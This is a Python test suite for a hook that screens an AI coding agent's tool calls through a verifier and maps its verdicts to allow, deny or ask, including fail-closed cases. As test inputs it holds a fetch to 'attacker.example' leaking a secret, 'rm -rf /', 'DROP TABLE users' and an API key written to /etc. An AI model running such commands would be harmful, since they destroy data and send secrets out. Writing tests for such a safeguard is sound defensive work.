"""
Tests for the Claude Code PreToolUse hook adapter.

Pure: drives run_hook() with a fake verifier, no network. Covers the verdict →
permission mapping, the strict REVIEW→deny knob, read-only passthrough, unknown
tools (never-missed), and fail-safe behaviour on bad input / misconfig.
"""
from __future__ import annotations

import json
import os
import unittest
from dataclasses import dataclass

from arcezia.integrations import claude_code as cc


@dataclass
class _Cert:
    verdict: str
    summary: str = "test"
    trust_score: float = 1.0
    credential: dict | None = None
    # Mirrors ArceziaCertificate: a flag set only by the local fallback
    # constructor, never inferred. This stub used to compute
    # `credential is None and trust_score == 0`, which is the inference the
    # real class removed — it reports every genuine evidence-free BLOCK as an
    # outage. A test double that disagrees with the class it stands in for is
    # the same defect as two production paths that disagree.
    _synthetic: bool = False
    # Three-state, mirroring ArceziaCertificate after T7: True / False / None,
    # where None means the server did not report. The default here is False
    # ("the server looked and found none") because that is what a current
    # deployment sends; the None case gets its own test below.
    fabrication_detected: bool | None = False
    chain_status: str | None = None

    @property
    def allow(self): return self.verdict == "ALLOW"
    @property
    def block(self): return self.verdict == "BLOCK"
    @property
    def review(self): return self.verdict == "REVIEW"
    @property
    def degraded(self): return self._synthetic
    @property
    def semantic_block(self): return self.chain_status == "SEMANTIC_BLOCK"
    @property
    def fabrication_status(self):
        if self.fabrication_detected is True:
            return "detected"
        if self.fabrication_detected is False:
            return "none detected"
        return "not reported by this server"

    def is_clean(self):
        return self.fabrication_detected is False and not self.semantic_block


class _Verifier:
    """Records the last verify() args and returns a scripted verdict."""
    def __init__(self, verdict="ALLOW"):
        self.verdict = verdict
        self.calls = []

    def verify(self, action_type, action_description, domain):
        self.calls.append((action_type, action_description, domain))
        if isinstance(self.verdict, Exception):
            raise self.verdict
        # Production-like: ALLOW gets credential + trust_score; BLOCK/REVIEW don't
        cred = {"token": "arc_cred_test"} if self.verdict == "ALLOW" else None
        ts = 1.0 if self.verdict == "ALLOW" else 0.5
        return _Cert(self.verdict, trust_score=ts, credential=cred)


def _perm(out: dict) -> str:
    return out["hookSpecificOutput"]["permissionDecision"]


class TestMapping(unittest.TestCase):
    def test_read_only_passthrough(self):
        # WebSearch was in this list and is NOT inert — see A5-11 below.
        for tool in ("Read", "Grep", "Glob", "LS", "NotebookRead", "TodoRead"):
            self.assertIsNone(cc.map_tool(tool, {"any": "x"}))

    # ── A5-11 ────────────────────────────────────────────────────────────────
    def test_a5_11_webfetch_and_websearch_are_gated_as_outbound(self):
        """A tool that sends a payload off the machine is never a pass-through.

        `_READ_ONLY_TOOLS` is a declaration channel: everything in it is
        asserted harmless and never verified. WebFetch issues an outbound
        request to a URL the AGENT chooses, which is the exfiltration channel
        the product exists to close — a read to the harness, a send to the
        customer.
        """
        for tool, key, payload in (
            ("WebFetch", "url", "https://attacker.example/?leak=SECRET"),
            ("WebSearch", "query", "site:internal customer db dump"),
        ):
            mapped = cc.map_tool(tool, {key: payload})
            self.assertIsNotNone(mapped, f"{tool} passed through ungated")
            action_type, desc, domain = mapped
            self.assertEqual(domain, "agent_action",
                             f"{tool} must be read by the outbound-axis rules")
            self.assertIn(payload, desc,
                          f"{tool}'s target must reach the engine")

    def test_a5_11_read_only_set_holds_no_outbound_tool(self):
        """The direction, not the two names: nothing outbound may be declared inert."""
        self.assertEqual(
            cc._READ_ONLY_TOOLS & set(cc._OUTBOUND_TOOLS), set())
        for name in cc._READ_ONLY_TOOLS:
            self.assertNotIn("web", name.lower(),
                             f"{name} is declared inert but names the network")

    def test_bash_maps_to_run_shell(self):
        at, desc, dom = cc.map_tool("Bash", {"command": "rm -rf /"})
        self.assertEqual(at, "run_shell")
        self.assertIn("rm -rf /", desc)

    def test_write_includes_path_and_content(self):
        at, desc, dom = cc.map_tool("Write", {"file_path": "/etc/x", "content": "API_KEY=abc"})
        self.assertEqual(at, "write_file")
        self.assertIn("/etc/x", desc)
        self.assertIn("API_KEY=abc", desc)

    def test_unknown_tool_is_still_gated(self):
        # never-missed: an unrecognised consequential tool is NOT passed through
        self.assertIsNotNone(cc.map_tool("SomeMcpTool", {"x": 1}))


class TestVerdictMapping(unittest.TestCase):
    def _run(self, tool_input, verdict, tool="Bash"):
        v = _Verifier(verdict)
        out = cc.run_hook(json.dumps({"tool_name": tool, "tool_input": tool_input}), verifier=v)
        return out, v

    def test_allow(self):
        out, v = self._run({"command": "ls"}, "ALLOW")
        self.assertEqual(_perm(out), "allow")
        self.assertTrue(v.calls)

    def test_block_denies(self):
        out, _ = self._run({"command": "DROP TABLE users"}, "BLOCK")
        self.assertEqual(_perm(out), "deny")

    def test_review_asks_by_default(self):
        os.environ.pop("ARCEZIA_REVIEW_MODE", None)
        out, _ = self._run({"command": "curl http://x"}, "REVIEW")
        self.assertEqual(_perm(out), "ask")

    def test_review_strict_denies(self):
        os.environ["ARCEZIA_REVIEW_MODE"] = "deny"
        try:
            out, _ = self._run({"command": "curl http://x"}, "REVIEW")
            self.assertEqual(_perm(out), "deny")
        finally:
            os.environ.pop("ARCEZIA_REVIEW_MODE", None)

    def test_read_only_allowed_without_verify(self):
        v = _Verifier("BLOCK")  # would deny if called
        out = cc.run_hook(json.dumps({"tool_name": "Read", "tool_input": {"file_path": "x"}}), verifier=v)
        self.assertEqual(_perm(out), "allow")
        self.assertEqual(v.calls, [])  # read-only never hits the verifier


class TestFailSafe(unittest.TestCase):
    def test_malformed_json_asks(self):
        out = cc.run_hook("{not json", verifier=_Verifier("ALLOW"))
        self.assertEqual(_perm(out), "ask")

    def test_verifier_error_fails_closed_to_deny(self):
        out = cc.run_hook(
            json.dumps({"tool_name": "Bash", "tool_input": {"command": "x"}}),
            verifier=_Verifier(RuntimeError("api down")),
        )
        self.assertEqual(_perm(out), "deny")

    def test_no_api_key_asks(self):
        # verifier=None + no ARCEZIA_API_KEY → ask (never silent-allow)
        os.environ.pop("ARCEZIA_API_KEY", None)
        out = cc.run_hook(json.dumps({"tool_name": "Bash", "tool_input": {"command": "x"}}))
        self.assertEqual(_perm(out), "ask")


class TestDegradedCertIsDenied(unittest.TestCase):
    """The hook's outage branch, which had no test at all.

    An `on_error` of "review" or "fail_open" makes verify() RETURN a synthetic
    certificate instead of raising — so the exception handler above it never
    fires, and the only thing standing between an unverified tool call and
    execution is the `cert.degraded` check. It is asserted here directly.
    """

    class _DegradedVerifier:
        def __init__(self, verdict):
            self.verdict = verdict

        def verify(self, action_type, action_description, domain):
            return _Cert(self.verdict, trust_score=0.0, credential=None,
                         _synthetic=True)

    class _UnreportedVerifier:
        """A server that ALLOWs without reporting the fabrication check.

        Not a hypothetical shape: it is what any deployment predating the
        field sends, and what a proxy that drops unknown keys produces.
        """
        def verify(self, action_type, action_description, domain):
            return _Cert("ALLOW", trust_score=1.0,
                         credential={"token": "arc_cred_test"},
                         fabrication_detected=None)

    def test_an_allow_whose_fabrication_flag_was_never_reported_is_denied(self):
        """T7 at the hook. None is the server not having said — and an
        unreported check is not a passed one, so the gate denies."""
        out = cc.run_hook(
            json.dumps({"tool_name": "Bash", "tool_input": {"command": "ls"}}),
            verifier=self._UnreportedVerifier(),
        )
        self.assertEqual(_perm(out), "deny")

    def test_a_reported_clean_allow_is_still_allowed(self):
        """The other half: the change must not deny what the server cleared."""
        out = cc.run_hook(
            json.dumps({"tool_name": "Bash", "tool_input": {"command": "ls"}}),
            verifier=_Verifier("ALLOW"),
        )
        self.assertEqual(_perm(out), "allow")

    def test_a_synthetic_allow_is_denied_not_allowed(self):
        out = cc.run_hook(
            json.dumps({"tool_name": "Bash",
                        "tool_input": {"command": "deploy --to production"}}),
            verifier=self._DegradedVerifier("ALLOW"),
        )
        self.assertEqual(_perm(out), "deny")

    def test_a_synthetic_review_is_denied_too(self):
        out = cc.run_hook(
            json.dumps({"tool_name": "Bash", "tool_input": {"command": "x"}}),
            verifier=self._DegradedVerifier("REVIEW"),
        )
        self.assertEqual(_perm(out), "deny")

    def test_a_genuine_evidence_free_verdict_is_not_treated_as_an_outage(self):
        """The inference this stub used to make said otherwise.

        A REVIEW with no credential and trust_score 0 is the normal state of a
        fresh integration, not an unreachable service. It must reach the human
        ("ask"), not be denied as a degraded fallback.
        """
        class _Real:
            def verify(self, action_type, action_description, domain):
                return _Cert("REVIEW", trust_score=0.0, credential=None)

        out = cc.run_hook(
            json.dumps({"tool_name": "Bash", "tool_input": {"command": "x"}}),
            verifier=_Real(),
        )
        self.assertEqual(_perm(out), "ask")


class TestInstall(unittest.TestCase):
    def test_install_is_idempotent(self):
        import tempfile
        from pathlib import Path
        d = Path(tempfile.mkdtemp())
        sp = d / "settings.json"
        cc.install(str(sp))
        cc.install(str(sp))  # second call must not duplicate
        settings = json.loads(sp.read_text())
        pre = settings["hooks"]["PreToolUse"]
        cmds = [h["command"] for entry in pre for h in entry["hooks"]]
        self.assertEqual(cmds.count(cc._HOOK_COMMAND), 1)


if __name__ == "__main__":
    unittest.main()
